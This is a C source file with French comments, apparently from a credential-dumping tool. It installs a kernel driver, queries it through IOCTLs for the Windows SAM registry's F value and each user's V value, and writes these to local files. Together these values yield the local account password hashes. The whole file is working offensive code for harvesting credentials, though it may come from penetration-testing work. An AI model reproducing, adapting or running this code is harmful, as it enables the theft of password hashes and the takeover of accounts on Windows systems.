#include "samdump.h"

//FONCTION MAIN
void dumpHashes()
{
	//initialisation
	manager=NULL;
	service=NULL;
	int error = 0;
	int status = 0;

	status= driverStatus();
	//status du driver ?
	if(status==0)
	{
		printf(" [-] Impossible to query the driver status.\n");
		system("pause");
		return;
	}

	//si pas déjà installé, installation
	if(status == DRIVER_NOT_INSTALLED)
	{
		//installation
		if(!install_driver())
		{
			printf(" [-] Impossible to install the driver.\n");
			error=2;
		}
	}

	//si pas démarré, démarrage
	if((status == DRIVER_STOPPED || status == DRIVER_NOT_INSTALLED) && !error)
	{
		if(!start_service())
		{
			printf(" [-] Impossible to start the service.\n");
			error=1;
		}
	}
	
	//si pas d'erreurs (et service lancé, donc), analyse
	if(!error)
	{
		//analyse
		getRIDs();
		//stop, puisque lancé
		if(!stop_service())
			printf(" [-] Impossible to stop the service.\n");
	}
	
	if(error<1)
	{
		//si installé, désinstallation
		if(!remove_driver())
			printf(" [-] Impossible to delete the driver.\n");
	}

	sCCleanHandles();
}



//dump du sam
bool getRIDs()
{
	//handle sur le device
	HANDLE hDevice=NULL;
	//taille des IRP retours
	DWORD nbBytes=0;
	//offset du RID lu
	PBYTE nameOffset;
	//chaîne temporaire
	WCHAR temp[MAX_PATH];
	//fichier pour écriture
	FILE* f;
	//compteurs
	unsigned int i, j;
	//buffers pour les retours
	BYTE sam[0x10000];
	BYTE sam2[0x10000];
	//noms de clés pour récupérer les valeurs V après énumération des RID
	WCHAR keyName[MAX_PATH];
	WCHAR baseName[]=L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\";
	int len = wcslen(baseName)*sizeof(WCHAR);
	
	 //handle sur le device, pour passer les IRP
    hDevice = CreateFileA("\\\\.\\conixsamdump",GENERIC_WRITE|GENERIC_READ,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hDevice == NULL)
	{
		printf(" [-] Impossible to open an handle on the driver.\n");
		return false;
	}

	
	//récupération de la valeur F
	if(!DeviceIoControl(hDevice,(DWORD)IOCTL_RETRIEVE_F_BYTES,sam,0x10000,sam,0x10000,&nbBytes,NULL))
	{ 
		printf(" [-] Impossible to get the F value.\n");
		return false;
	}
	f=fopen("F", "w");
	fwrite(sam, 1, nbBytes, f);
	fclose(f);
	//printf(" [+] F value dumped\n");


	//énumération des RID
	if(!DeviceIoControl(hDevice,(DWORD)IOCTL_RETRIEVE_RID,sam,0x10000,sam,0x10000,&nbBytes,NULL))
	{ 
		printf(" [-] Impossible to get the RIDs.\n");
		return false;
	}
	
	ZeroMemory(keyName, sizeof(WCHAR)*MAX_PATH);
	wcscat_s(keyName, MAX_PATH, baseName);
	j = len;
	nameOffset = sam;

	for(i = 0; i<nbBytes; i++)
	{
		if(*(PWCHAR)(sam+i)==L'\n')
		{

			//récupération de la valeur V du RID actuel
			//effacement des anciennes valeurs
			ZeroMemory(sam2, 0x10000);
			ZeroMemory(temp, MAX_PATH);
			//copie du nom de la clé dans "sam2" (buffer I/O)
			CopyMemory(sam2, keyName, j);
			//copie du nom du RID dans "temp" pour créer le fichier / affichage
			CopyMemory(temp, nameOffset, j-len);
			//wprintf(L"Key : %s\n", sam2);
			//wprintf(L" [+] %s", temp);
			
			//récupération de V
			if(!DeviceIoControl(hDevice,(DWORD)IOCTL_RETRIEVE_RID_V_BYTES,sam2,0x10000,sam2,0x10000,&nbBytes,NULL))
			{ 
				printf(" ERROR : cannot communicate with the driver.\n", keyName);
			}
			if(nbBytes != 0)
			{
				f=_wfopen(temp, L"w");
				fwrite(sam2, 1, nbBytes, f);
				fclose(f);
				//printf(" V value dumped.\n");
			}
			//else
			//	printf(" do not have a V value.\n");
			

			//Remise à 0 du nom de clé / compteur
			ZeroMemory(keyName, sizeof(WCHAR)*MAX_PATH);
			wcscat_s(keyName, MAX_PATH, baseName);
			j = len;
			//incrémentation (un seul BYTE du prochain unicode)
			i++;
			//UNICODE, donc +2
			nameOffset = sam+i+1;

			if(i == nbBytes)
				break;
		}
		else
		{
			*((PBYTE)keyName+j) = sam[i];
			j++;
		}
	}
	

	CloseHandle(hDevice);
	return true;
}	
